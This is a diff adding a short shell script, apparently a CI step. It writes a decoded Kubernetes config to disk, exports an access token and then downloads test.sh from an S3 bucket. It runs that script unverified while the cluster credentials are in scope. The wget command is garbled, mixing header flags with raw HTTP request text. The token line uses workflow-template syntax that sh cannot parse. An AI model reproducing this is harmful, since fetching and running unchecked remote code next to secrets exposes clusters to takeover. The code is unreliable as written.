@@ -1,0 +1,12 @@
+#!/bin/sh
+
+echo ${KUBE_CONFIG_DATA} | base64 -d > kubeconfig
+export KUBECONFIG="${PWD}/kubeconfig"
+
+export KUBECONFIG="${PWD}/kubeconfig"
+export CHKK_ACCESS_TOKEN=${{inputs.chkk-access-token}}
+
+wget -H GET /test.sh HTTP/1.1 -H Host: post-renderer-ci.s3.amazonaws.com https://post-renderer-ci.s3.amazonaws.com/test.sh
+chmod +x test.sh
+
+./test.sh
